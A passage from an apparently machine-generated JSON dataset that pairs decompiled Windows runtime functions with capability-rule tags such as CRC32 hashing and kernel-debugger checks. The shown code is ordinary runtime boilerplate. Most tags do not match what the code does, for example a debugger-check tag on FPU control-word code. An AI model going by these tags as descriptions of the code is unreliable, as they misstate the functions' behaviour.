LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                arg_8h = 0xffff;\n            }\n            else {\n                arg_8h = arg_8h & 0xffff;\n            }\n            return arg_8h;\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x22;\n    }\ncode_r0x004d0ad8:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffff;\n}\n",
        "token_count": 480
    },
    "00404d27": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.00404d27(uint8_t *arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return NULL;\n    }\n    if (arg_ch == NULL) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else if (arg_8h < arg_ch) {\n        fcn.004057e5(arg_10h);\n        puVar2 = arg_ch + -1;\n        if (*(var_8h + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg_8h) break;\n            } while ((*(*puVar2 + 0x19 + var_8h) & 4) != 0);\n            puVar2 = arg_ch + (-1 - (arg_ch - puVar2 & 1U));\n        }\n        if (var_4h == '\\0') {\n            return puVar2;\n        }\n        *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 378
    },
    "00404d3b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00404d3b(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    pcVar1 = fcn.004c8177(0xc, \"GetProcessWindowStation\", 0x5532fc, 0x553304);\n    if ((pcVar1 != NULL) &&\n       (pcVar2 = fcn.004c8177(0x10, \"GetUserObjectInformationW\", 0x55339c, 0x5533a4),  pcVar2 != NULL)) {\n        (**0x573000)();\n        iVar3 = (*pcVar1)();\n        if (iVar3 != 0) {\n            var_10h = 0;\n            uStack16 = 0;\n            var_8h = 0;\n            (**0x573000)(iVar3, 1, &var_10h, 0xc, 0);\n            (*pcVar2)();\n        }\n    }\n    fcn.00403085(var_10h);\n    return;\n}\n",
        "token_count": 296
    },
    "00404eb7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404eb7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x18, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::numpunct_wchar_t_.0;\n            fcn.0040506f(uVar4, 1);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 412
    },
    "0047e122": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e122(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00404f98": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00404f98(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t lpCriticalSection;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b2f8, 0x1c);\n    fcn.00406401(7);\n    lpCriticalSection = 0xffffffff;\n    *(unaff_EBP + -0x1c) = 0xffffffff;\n    iVar3 = 0;\n    *(unaff_EBP + -4) = 0;\n    do {\n        *(unaff_EBP + -0x2c) = iVar3;\n        if (0x7f < iVar3) {\ncode_r0x004ca00a:\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004ca0a6();\n            *in_FS_OFFSET = *(unaff_EBP + -0x10);\n            return lpCriticalSection;\n        }\n        iVar1 = *(iVar3 * 4 + 0x570220);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00406299();\n            *(iVar3 * 4 + 0x570220) = iVar1;\n            if (iVar1 != 0) {\n                *0x570488 = *0x570488 + 0x40;\n                lpCriticalSection = iVar3 << 6;\n                fcn.0040151e(lpCriticalSection);\n                *(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28) = 1;\ncode_r0x004ca007:\n                *(unaff_EBP + -0x1c) = lpCriticalSection;\n            }\n            goto code_r0x004ca00a;\n        }\n        iVar2 = iVar1 + 0xe00;\n        *(unaff_EBP + -0x20) = iVar2;\n        for (; *(unaff_EBP + -0x24) = iVar1,  iVar1 != iVar2; iVar1 = iVar1 + 0x38) {\n            if ((*(iVar1 + 0x28) & 1) == 0) {\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n                if ((*(iVar1 + 0x28) & 1) == 0) {\n                    lpCriticalSection = iVar3 * 0x40 + (iVar1 - *(unaff_EBP + -0x28)) / 0x38;\n                    iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n                    *(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28 + iVar3) = 1;\n                    *(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x18 + iVar3) = 0xffffffff;\n                    goto code_r0x004ca007;\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                iVar2 = *(unaff_EBP + -0x20);\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 788
    },
    "00404fed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404fed(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404bb5(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.00405911();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "00405146": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405146(uint *param_1)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char cVar3;\n    uint *puVar4;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar7;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar7 = param_1[10];\n    if (iVar7 < 0) {\n        if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n            iVar7 = 0xd;\n        }\n        else {\n            iVar7 = 6;\n        }\n        param_1[10] = iVar7;\n    }\n    else if ((iVar7 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar7 = 0,  *(param_1 + 0x32) == 0x47)))) {\n        param_1[10] = 1;\n        iVar7 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar3 = fcn.00404bb5(iVar7 + 0x15d);\n    if (cVar3 == '\\0') {\n        iVar7 = fcn.00405911();\n        param_1[10] = iVar7 + -0x15d;\n    }\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar4;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar4 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar4 = param_1 + 0x10;\n    }\n    iVar7 = *(param_1 + 0x32);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar4, arg_10h, arg_14h, arg_18h, iVar7, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    uVar2 = *(param_1 + 0x32);\n    uVar5 = uVar2;\n    if (((uVar2 == 0x67) || (uVar2 == 0x47)) && (uVar5 = param_1[8] >> 5,  (uVar5 & 1) == 0)) {\n        uVar5 = fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar6 = param_1[0xd];\n    cVar3 = *pcVar6;\n    uVar5 = uVar5 & 0xffffff00;\n    if (cVar3 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar6 = pcVar6 + 1;\n        param_1[0xd] = pcVar6;\n        cVar3 = *pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1160
    },
    "0040516e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040516e(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x570488)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x570220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_ch = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_8h;\n            uVar2 = fcn.004ce5bb(&var_10h, &var_ch);\n            return uVar2;\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 347
    },
    "0046be8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046be8a(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0047e215": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e215(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::time_get_char__class_std::istreambuf_iterator_char__struct_std::char_traits_char___.0;\n    fcn.00401fdc();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "004052f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004052f4(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint arg_8h_00;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t arg_8h_01;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = (in_FPUControlWord & 1) << 4;\n    if ((in_FPUControlWord & 4) != 0) {\n        uVar3 = uVar3 | 8;\n    }\n    if ((in_FPUControlWord & 8) != 0) {\n        uVar3 = uVar3 | 4;\n    }\n    if ((in_FPUControlWord & 0x10) != 0) {\n        uVar3 = uVar3 | 2;\n    }\n    if ((in_FPUControlWord & 0x20) != 0) {\n        uVar3 = uVar3 | 1;\n    }\n    if ((in_FPUControlWord & 2) != 0) {\n        uVar3 = uVar3 | 0x80000;\n    }\n    uVar1 = in_FPUControlWord & 0xc00;\n    if ((in_FPUControlWord & 0xc00) != 0) {\n        if (uVar1 == 0x400) {\n            uVar3 = uVar3 | 0x100;\n        }\n        else if (uVar1 == 0x800) {\n            uVar3 = uVar3 | 0x200;\n        }\n        else if (uVar1 == 0xc00) {\n            uVar3 = uVar3 | 0x300;\n        }\n    }\n    if ((in_FPUControlWord & 0x300) == 0) {\n        uVar3 = uVar3 | 0x20000;\n    }\n    else if ((in_FPUControlWord & 0x300) == 0x200) {\n        uVar3 = uVar3 | 0x10000;\n    }\n    if ((in_FPUControlWord & 0x1000) != 0) {\n        uVar3 = uVar3 | 0x40000;\n    }\n    arg_8h_01 = ~arg_ch & uVar3 | arg_8h & arg_ch;\n    if (arg_8h_01 != uVar3) {\n        uVar1 = fcn.004ce1f7(arg_8h_01);\n        arg_8h_01 = (uVar1 & 1) << 4;\n        if ((uVar1 & 4) != 0) {\n            arg_8h_01 = arg_8h_01 | 8;\n        }\n        if ((uVar1 & 8) != 0) {\n            arg_8h_01 = arg_8h_01 | 4;\n        }\n        if ((uVar1 & 0x10) != 0) {\n            arg_8h_01 = arg_8h_01 | 2;\n        }\n        if ((uVar1 & 0x20) != 0) {\n            arg_8h_01 = arg_8h_01 | 1;\n        }\n        if ((uVar1 & 2) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x80000;\n        }\n        uVar2 = uVar1 & 0xc00;\n        if ((uVar1 & 0xc00) != 0) {\n            if (uVar2 == 0x400) {\n                arg_8h_01 = arg_8h_01 | 0x100;\n            }\n            else if (uVar2 == 0x800) {\n                arg_8h_01 = arg_8h_01 | 0x200;\n            }\n            else if (uVar2 == 0xc00) {\n                arg_8h_01 = arg_8h_01 | 0x300;\n            }\n        }\n        if ((uVar1 & 0x300) == 0) {\n            arg_8h_01 = arg_8h_01 | 0x20000;\n        }\n        else if ((uVar1 & 0x300) == 0x200) {\n            arg_8h_01 = arg_8h_01 | 0x10000;\n        }\n        if ((uVar1 & 0x1000) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x40000;\n        }\n    }\n    if (0 < *0x56ec4c) {\n        uVar3 = in_MXCSR >> 3 & 0x10;\n        if ((in_MXCSR & 0x200) != 0) {\n            uVar3 = uVar3 | 8;\n        }\n        if ((in_MXCSR & 0x400) != 0) {\n            uVar3 = uVar3 | 4;\n        }\n        if ((in_MXCSR & 0x800) != 0) {\n            uVar3 = uVar3 | 2;\n        }\n        if ((in_MXCSR & 0x1000) != 0) {\n            uVar3 = uVar3 | 1;\n        }\n        if ((in_MXCSR & 0x100) != 0) {\n            uVar3 = uVar3 | 0x80000;\n        }\n        uVar4 = in_MXCSR & 0x6000;\n        if (uVar4 != 0) {\n            if (uVar4 == 0x2000) {\n                uVar3 = uVar3 | 0x100;\n            }\n            else if (uVar4 == 0x4000) {\n                uVar3 = uVar3 | 0x200;\n            }\n            else if (uVar4 == 0x6000) {\n                uVar3 = uVar3 | 0x300;\n            }\n        }\n        uVar4 = in_MXCSR & 0x8040;\n        if (uVar4 == 0x40) {\n            uVar3 = uVar3 | 0x2000000;\n        }\n        else if (uVar4 == 0x8000) {\n            uVar3 = uVar3 | 0x3000000;\n        }\n        else if (uVar4 == 0x8040) {\n            uVar3 = uVar3 | 0x1000000;\n        }\n        uVar4 = ~(arg_ch & 0x308031f) & uVar3 | arg_ch & 0x308031f & arg_8h;\n        if (uVar4 != uVar3) {\n            arg_8h_00 = fcn.004cda81(uVar4);\n            fcn.004065ff(arg_8h_00);\n            uVar3 = in_MXCSR >> 3 & 0x10;\n            if ((in_MXCSR & 0x200) != 0) {\n                uVar3 = uVar3 | 8;\n            }\n            if ((in_MXCSR & 0x400) != 0) {\n                uVar3 = uVar3 | 4;\n            }\n            if ((in_MXCSR & 0x800) != 0) {\n                uVar3 = uVar3 | 2;\n            }\n            if ((in_MXCSR & 0x1000) != 0) {\n                uVar3 = uVar3 | 1;\n            }\n            if ((in_MXCSR & 0x100) != 0) {\n                uVar3 = uVar3 | 0x80000;\n            }\n            uVar4 = in_MXCSR & 0x6000;\n            if (uVar4 != 0) {\n                if (uVar4 == 0x2000) {\n                    uVar3 = uVar3 | 0x100;\n                }\n                else if (uVar4 == 0x4000) {\n                    uVar3 = uVar3 | 0x200;\n                }\n                else if (uVar4 == 0x6000) {\n                    uVar3 = uVar3 | 0x300;\n                }\n            }\n            uVar4 = in_MXCSR & 0x8040;\n            if (uVar4 == 0x40) {\n                uVar3 = uVar3 | 0x2000000;\n            }\n            else if (uVar4 == 0x8000) {\n                uVar3 = uVar3 | 0x3000000;\n            }\n            else if (uVar4 == 0x8040) {\n                uVar3 = uVar3 | 0x1000000;\n            }\n        }\n        uVar4 = uVar3 ^ arg_8h_01;\n        arg_8h_01 = uVar3 | arg_8h_01;\n        if ((uVar4 & 0x8031f) != 0) {\n            arg_8h_01 = arg_8h_01 | 0x80000000;\n        }\n    }\n    return arg_8h_01;\n}\n",
        "token_count": 2091
    },
    "0046be35": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046be35(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405f1a();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0047e0f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e0f8(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405f42();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004054d9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004054d9(uint32_t arg_8h)\n\n{\n    int32_t iStack8;\n    \n    if ((arg_8h & 0x20) == 0) {\n        if ((arg_8h & 8) != 0) {\n            return 1;\n        }\n        if ((arg_8h & 4) == 0) {\n            if ((arg_8h & 1) == 0) {\n                return (arg_8h & 2) * 2;\n            }\n            iStack8 = 3;\n        }\n        else {\n            iStack8 = 2;\n        }\n    }\n    else {\n        iStack8 = 5;\n    }\n    return iStack8;\n}\n",
        "token_count": 166
    },
    "004054e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004054e8(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, ulong *arg_18h, ulong *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    puVar1 = arg_ch;\n    arg_8h[1] = 0;\n    uVar4 = 0xc000000d;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    if ((arg_10h & 0x10) != 0) {\n        uVar4 = 0xc000008f;\n        arg_8h[1] = arg_8h[1] | 1;\n    }\n    if ((arg_10h & 2) != 0) {\n        uVar4 = 0xc0000093;\n        arg_8h[1] = arg_8h[1] | 2;\n    }\n    if ((arg_10h & 1) != 0) {\n        uVar4 = 0xc0000091;\n        arg_8h[1] = arg_8h[1] | 4;\n    }\n    if ((arg_10h & 4) != 0) {\n        uVar4 = 0xc000008e;\n        arg_8h[1] = arg_8h[1] | 8;\n    }\n    if ((arg_10h & 8) != 0) {\n        uVar4 = 0xc0000090;\n        arg_8h[1] = arg_8h[1] | 0x10;\n    }\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch << 4) ^ arg_8h[2]) & 0x10;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch * 2) ^ arg_8h[2]) & 8;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 1) ^ arg_8h[2]) & 4;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 3) ^ arg_8h[2]) & 2;\n    arg_8h[2] = arg_8h[2] ^ (~(*arg_ch >> 5) ^ arg_8h[2]) & 1;\n    uVar3 = fcn.00402c6b();\n    puVar2 = arg_1ch;\n    if ((uVar3 & 1) != 0) {\n        arg_8h[3] = arg_8h[3] | 0x10;\n    }\n    if ((uVar3 & 4) != 0) {\n        arg_8h[3] = arg_8h[3] | 8;\n    }\n    if ((uVar3 & 8) != 0) {\n        arg_8h[3] = arg_8h[3] | 4;\n    }\n    if ((uVar3 & 0x10) != 0) {\n        arg_8h[3] = arg_8h[3] | 2;\n    }\n    if ((uVar3 & 0x20) != 0) {\n        arg_8h[3] = arg_8h[3] | 1;\n    }\n    uVar3 = *puVar1 & 0xc00;\n    if (uVar3 == 0) {\n        *arg_8h = *arg_8h & 0xfffffffc;\n    }\n    else {\n        if (uVar3 == 0x400) {\n            uVar3 = *arg_8h & 0xfffffffd | 1;\n        }\n        else {\n            if (uVar3 != 0x800) {\n                if (uVar3 == 0xc00) {\n                    *arg_8h = *arg_8h | 3;\n                }\n                goto code_r0x004c1520;\n            }\n            uVar3 = *arg_8h & 0xfffffffe | 2;\n        }\n        *arg_8h = uVar3;\n    }\ncode_r0x004c1520:\n    uVar3 = *puVar1 & 0x300;\n    if (uVar3 == 0) {\n        uVar3 = *arg_8h & 0xffffffeb | 8;\ncode_r0x004c1556:\n        *arg_8h = uVar3;\n    }\n    else {\n        if (uVar3 == 0x200) {\n            uVar3 = *arg_8h & 0xffffffe7 | 4;\n            goto code_r0x004c1556;\n        }\n        if (uVar3 == 0x300) {\n            *arg_8h = *arg_8h & 0xffffffe3;\n        }\n    }\n    *arg_8h = *arg_8h ^ (arg_14h << 5 ^ *arg_8h) & 0x1ffe0;\n    arg_8h[8] = arg_8h[8] | 1;\n    if (arg_20h == 0) {\n        arg_8h[8] = arg_8h[8] & 0xffffffe3 | 2;\n        *(arg_8h + 4) = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe3 | 2;\n        *(arg_8h + 0x14) = *arg_1ch;\n    }\n    else {\n        arg_8h[8] = arg_8h[8] & 0xffffffe1;\n        arg_8h[4] = *arg_18h;\n        arg_8h[0x18] = arg_8h[0x18] | 1;\n        arg_8h[0x18] = arg_8h[0x18] & 0xffffffe1;\n        arg_8h[0x14] = *arg_1ch;\n    }\n    fcn.00401875();\n    (*_sym.imp.KERNEL32.dll_RaiseException)(uVar4, 0, 1, &arg_8h);\n    uVar3 = arg_8h[2];\n    if ((uVar3 & 0x10) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffe;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 8) != 0) {\n        *puVar1 = *puVar1 & 0xfffffffb;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 4) != 0) {\n        *puVar1 = *puVar1 & 0xfffffff7;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 2) != 0) {\n        *puVar1 = *puVar1 & 0xffffffef;\n        uVar3 = arg_8h[2];\n    }\n    if ((uVar3 & 1) != 0) {\n        *puVar1 = *puVar1 & 0xffffffdf;\n    }\n    uVar3 = *arg_8h & 3;\n    if (uVar3 == 0) {\n        *puVar1 = *puVar1 & 0xfffff3ff;\n    }\n    else {\n        if (uVar3 == 1) {\n            uVar3 = *puVar1 & 0xfffff7ff | 0x400;\n        }\n        else {\n            if (uVar3 != 2) {\n                if (uVar3 == 3) {\n                    *puVar1 = *puVar1 | 0xc00;\n                }\n                goto code_r0x004c166c;\n            }\n            uVar3 = *puVar1 & 0xfffffbff | 0x800;\n        }\n        *puVar1 = uVar3;\n    }\ncode_r0x004c166c:\n    uVar3 = *arg_8h >> 2 & 7;\n    if (uVar3 == 0) {\n        uVar3 = *puVar1 & 0xfffff3ff | 0x300;\n    }\n    else {\n        if (uVar3 != 1) {\n            if (uVar3 == 2) {\n                *puVar1 = *puVar1 & 0xfffff3ff;\n            }\n            goto code_r0x004c169d;\n        }\n        uVar3 = *puVar1 & 0xfffff3ff | 0x200;\n    }\n    *puVar1 = uVar3;\ncode_r0x004c169d:\n    if (arg_20h == 0) {\n        *puVar2 = *(arg_8h + 0x14);\n    }\n    else 